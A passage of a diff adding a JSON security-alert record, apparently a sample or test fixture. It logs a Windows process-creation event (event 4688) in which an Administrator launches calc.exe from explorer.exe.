+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T17:43:27.024572Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xcc2d4"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:42:48.024581Z",
+      "location": "EventChannel"
+    }
+  }
+]
